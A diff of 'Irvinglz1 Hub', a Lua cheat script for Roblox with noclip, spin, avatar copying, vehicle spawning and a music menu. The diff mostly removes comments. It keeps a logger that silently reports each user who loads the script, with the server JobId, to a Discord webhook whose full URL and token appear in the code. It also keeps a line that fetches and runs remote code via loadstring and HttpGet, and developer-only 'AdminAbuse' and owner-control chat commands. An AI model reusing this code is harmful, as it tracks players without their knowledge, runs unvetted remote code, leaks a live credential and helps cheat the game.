@@ -1,11 +1,8 @@
---// Irvinglz1 Hub \\--
 
---==[[ Ban System ]]==--
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
 
--- Variable global para activar el sistema de owner
 getgenv().IRVING_SCRIPT_ACTIVE = true
 
 local bannedUsers = {}
@@ -62,15 +59,12 @@ if bannedUsers[player.Name] then
     return
 end
 
---===[[ LOGGER - Registra quién carga el script con JobId (Embed) ]]===--
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 
--- 🔥 Webhook de Discord
 local LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1540025646238142515/f4-38N3g2j6TotKD7A-9dcBD2JoQOOdC_75SgjYzY_S5KQLhASgUrKT6c_A0A84PUKoA"
 
--- Variable para evitar duplicados
 local logged = false
 
 local function sendLog()
@@ -164,13 +158,11 @@ local function sendLog()
     end)
 end
 
--- Ejecutar el logger cuando el script se carga
 task.spawn(function()
     task.wait(1)
     sendLog()
 end)
 
---===[[ Updates UI ]]===--
 local ScreenGui = Instance.new("ScreenGui")
 local MainFrame = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
@@ -315,7 +307,6 @@ btnCorner.Parent = ExitBtn
 ExitBtn.MouseButton1Click:Wait() 
 ScreenGui:Destroy()
 
---===[[ Loading TextScreen ]]===--
 local TweenService = game:GetService("TweenService")
 local CoreGui = game:GetService("CoreGui")
 
@@ -369,7 +360,6 @@ textFade:Play()
 fadeOut.Completed:Wait()
 gui:Destroy()
 
---===[[ AutoSetBioName ]]===--
 local function SetDefaultNameAndBio()
     local player = game.Players.LocalPlayer
     local displayName = player.DisplayName 
@@ -388,7 +378,6 @@ end
 
 SetDefaultNameAndBio()
 
---===[[ Rayfield WindowCreation ]]===--
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 local Window = Rayfield:CreateWindow({
@@ -409,7 +398,6 @@ Rayfield:Notify({
     Image = 4483362458,
 })
 
---===[[ Button press sound ]]===--
 local function ButtonPSound()
     local welcomeSound = Instance.new("Sound")
     welcomeSound.Name = "WelcomeSound"
@@ -420,7 +408,6 @@ local function ButtonPSound()
     game:GetService("Debris"):AddItem(welcomeSound, 10)
 end
 
---===[[ Irving Music GUI ]]===--
 task.spawn(function()
     task.wait(1)
     local CoreGui = game:GetService("CoreGui")
@@ -433,7 +420,6 @@ task.spawn(function()
     end
 end)
 
---===[[ AdminAbuse ]]===--
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local DEV_USERS = {"Hiimnew928289alt2"}
@@ -486,7 +472,6 @@ Players.PlayerAdded:Connect(function(plr)
     end)
 end)
 
---===[[ Variables ChatCommand ]]===--
 local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local RunService = game:GetService("RunService")
@@ -522,7 +507,6 @@ local normalWalkSpeed = 16
 local AntiSitConnections = AntiSitConnections or {}
 local AntiSitEnabled = false
 
---===[[ AntiSit/Sit ]]===--
 local function ClearAntiSit()
     AntiSitEnabled = false
     for _, conn in ipairs(AntiSitConnections) do
@@ -595,13 +579,11 @@ local function SetAntiSit(state)
     end
 end
 
--- refresh character
 player.CharacterAdded:Connect(function(char)
     character = char
     humanoid = char:WaitForChild("Humanoid")
 end)
 
--- Noclip loop
 RunService.Stepped:Connect(function()
     if noclip and character then
         for _, v in pairs(character:GetDescendants()) do
@@ -612,7 +594,6 @@ RunService.Stepped:Connect(function()
     end
 end)
 
--- Spin loop
 RunService.RenderStepped:Connect(function()
     if spin and character and character:FindFirstChild("HumanoidRootPart") then
         character.HumanoidRootPart.CFrame =
@@ -621,7 +602,6 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
--- Smart Player Finder
 local function findPlayer(name)
     name = name:lower()
     for _, plr in pairs(Players:GetPlayers()) do
@@ -714,7 +694,6 @@ Players.PlayerAdded:Connect(function(plr)
     end)
 end)
 
---===[[ Funciones de música y vehículos ]]===--
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RE = ReplicatedStorage:WaitForChild("RE")
 local vehicleRemote = RE:WaitForChild("1NoMoto1rVehicle1s")
@@ -985,7 +964,6 @@ PlaysTb:CreateParagraph({
     Content = "El vehículo aparecerá al presionar el botón, y el personaje volará automáticamente después de 1 segundo. Presiona 'Eliminar' para reiniciar."
 })
 
--- ====== TODAS LAS CANCIONES CON BOTÓN PLAY ======
 AddSong(SongsTb, "JULIAN LEYVA - C*LITOS BAILANDO [NuevoId]", 113875800950122)
 AddSong(SongsTb, "50/50 - Ando en la Disco[NuevoId]", 113647013354970)
 AddSong(SongsTb, "Lunay, Omar Courtz MI BB loud", 129843288099786)
@@ -1095,9 +1073,7 @@ AddSong(SongsTb, "Ñengo Flow - SI ME HICIERA EL DE LA LENGUA", 85081125606012)
 AddSong(SongsTb, "Midnvght - MIENTEME", 133983548973786)
 AddSong(SongsTb, "Hades66 - Nose El Nombre", 104274011253531)
 AddSong(SongsTb, "3AM Remix", 93033474244979)
--- ====== FIN CANCIONES ======
 
---===[[ Scripts Tab ]]===--
 ScriptsTb:CreateSection("Fly GUI")
 ScriptsTb:CreateButton({
     Name = "Fly V3",
@@ -1134,7 +1110,6 @@ ScriptsTb:CreateButton({
     end
 })
 
---===[[ NUEVA PESTAÑA: AVATAR ]]===--
 local AvatarTb = Window:CreateTab("👔 Avatar [Nuevo]", 4483362458)
 
 AvatarTb:CreateSection("📋 Copiar Avatar de Otro Jugador")
@@ -1497,7 +1472,6 @@ for category, animations in pairs(AnimData) do
     })
 end
 
---===[[ NUEVA PESTAÑA: CASA ]]===--
 local CasaTab = Window:CreateTab("🏠 Casa [Nuevo]", 4483362458)
 
 CasaTab:CreateSection("🌈 RGB")
@@ -1906,7 +1880,6 @@ CasaTab:CreateDropdown({
     end
 })
 
---===[[ Configuración ]]===--
 local Settings = Window:CreateTab("⚙️ Settings", 4483362458) 
 
 Settings:CreateSection("RGB")
@@ -2019,7 +1992,6 @@ Settings:CreateToggle({
    end,
 })
 
--- Server Options
 Settings:CreateSection("Server Option")
 Settings:CreateButton({
     Name = "🔁 Rejoin Server",
@@ -2050,13 +2022,11 @@ Settings:CreateParagraph({
     Content = "Irvinglz1 Hub\nDesarrollado por Hiimnew928289alt2"
 })
 
---===[[ DevCrown - Corona sincronizada para TODOS (CON RAYFIELD) ]]===--
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local DEV_USER = "Hiimnew928289alt2"
 
--- Crear variable global en ReplicatedStorage
 local function GetCrownStatus()
     local status = ReplicatedStorage:FindFirstChild("CrownStatus")
     if not status then
@@ -2070,7 +2040,6 @@ end
 
 local crownStatus = GetCrownStatus()
 
--- 👑 Función para crear la etiqueta "Owner"
 local function addOwnerLabel(character)
     if not character then return end
     local head = character:FindFirstChild("Head")
@@ -2096,7 +2065,6 @@ local function addOwnerLabel(character)
     text.Parent = label
 end
 
--- 🔄 Función para actualizar etiqueta
 local function updateLabel(character)
     if not character then return end
     
@@ -2113,7 +2081,6 @@ local function updateLabel(character)
     end
 end
 
--- 👀 Vigilar al owner
 local function watchOwner(plr)
     if plr.Name ~= DEV_USER then return end
 
@@ -2128,7 +2095,6 @@ local function watchOwner(plr)
     end)
 end
 
--- Iniciar vigilancia
 for _, plr in pairs(Players:GetPlayers()) do
     watchOwner(plr)
 end
@@ -2143,7 +2109,6 @@ Players.PlayerAdded:Connect(function(plr)
     end
 end)
 
--- ========== COMANDOS EN EL CHAT (CON RAYFIELD) ==========
 player.Chatted:Connect(function(msg)
     if msg:lower() == "!crown on" then
         if player.Name ~= DEV_USER then
@@ -2185,7 +2150,6 @@ player.Chatted:Connect(function(msg)
     end
 end)
 
--- 📡 Escuchar cambios globales
 crownStatus.Changed:Connect(function()
     local ownerPlayer = Players:FindFirstChild("Hiimnew928289alt2")
     if ownerPlayer and ownerPlayer.Character then
@@ -2193,12 +2157,10 @@ crownStatus.Changed:Connect(function()
     end
 end)
 
---===[[ Detector de Owner - Para Executor (MEJORADO) ]]===--
 
 local OWNER_USERNAME = Players.LocalPlayer.Name
 local notificationShown = false
 
--- Crear o obtener la carpeta de control
 local function GetControlFolder()
     local folder = ReplicatedStorage:FindFirstChild("ScriptControl")
     if not folder then
@@ -2275,7 +2237,6 @@ end
 local player = Players.LocalPlayer
 local controlFolder = GetControlFolder()
 
--- 🔍 Verificar quién ejecutó el script
 local function CheckForOwner()
     -- Si TÚ eres el owner
     if player.Name == OWNER_USERNAME then
@@ -2305,10 +2266,8 @@ local function CheckForOwner()
     end
 end
 
--- Ejecutar verificación
 CheckForOwner()
 
--- Detectar si el owner llega al servidor después
 Players.PlayerAdded:Connect(function(player)
     if player.Name == OWNER_USERNAME then
         if player.Name ~= Players.LocalPlayer.Name then
@@ -2318,7 +2277,6 @@ Players.PlayerAdded:Connect(function(player)
     end
 end)
 
----------------------------------------
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
@@ -2349,7 +2307,6 @@ local function GetTPPosition()
     return position
 end
 
--- Registrar que el script está ejecutado
 local function RegisterPlayer()
     local userIdFolder = tpFolder:FindFirstChild(tostring(player.UserId))
     if not userIdFolder then
@@ -2429,3 +2386,6 @@ end)
 
 
 
+print("🎵 Irvinglz1 Hub cargado correctamente!")
+print("📱 Discord: " .. DISCORD_INVITE)
+print("🎵 TikTok: " .. TIKTOK_USER)
